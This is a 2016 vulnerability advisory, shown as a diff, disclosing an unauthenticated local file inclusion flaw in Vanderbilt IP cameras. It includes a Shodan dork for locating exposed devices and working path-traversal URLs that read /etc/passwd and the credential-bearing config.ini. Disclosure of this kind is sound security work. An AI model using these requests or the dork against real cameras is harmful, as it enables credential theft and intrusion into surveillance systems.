@@ -1,0 +1,41 @@
+1. Advisory Information
+========================================
+Title                   : Vanderbilt IP-Camera (CCPW3025-IR + CVMW3025-IR) Local File Inclusion
+Vendor Homepage         : https://is.spiap.com/
+Remotely Exploitable	: Yes
+Tested on Camera types	: CCPW3025-IR , CVMW3025-IR
+Product References      : https://is.spiap.com/products/video/1_cameras/11_ip_camerars/bullet-kameror/v54561-c117-a100.html
++                       : https://uk.spiap.com/products/video/1_cameras/11_ip_camerars/114_vandal_resistent_dome_cameras/cvmw3025-ir.html
+Vulnerability           : Local File Inclusion (Critical/High)
+Shodan Dork             : title:"Vanderbilt IP-Camera"
+Date                    : 20/08/2016
+Author                  : Yakir Wizman (https://www.linkedin.com/in/yakirwizman)
+
+
+2. CREDIT
+========================================
+This vulnerability was identified during penetration test by Yakir Wizman.
+
+
+3. Description
+========================================
+Vanderbilt IP-Camera (CCPW3025-IR + CVMW3025-IR) allows to unauthenticated user to include files from local server such as /etc/passwd, /etc/shadow or config.ini which contains all credentials and other configurations.
+
+
+4. Proof-of-Concept:
+========================================
+For example you can get /etc/passwd
+http://host:port/cgi-bin/check.cgi?file=../../../etc/passwd
+http://host:port/cgi-bin/chklogin.cgi?file=../../../etc/passwd
+
+Or config.ini file:
+
+http://host:port/cgi-bin/check.cgi?file=config.ini
+http://host:port/cgi-bin/chklogin.cgi?file=config.ini
+
+
+
+
+5. SOLUTION
+========================================
+Contact the vendor for further information regarding the proper mitigation of this vulnerability.
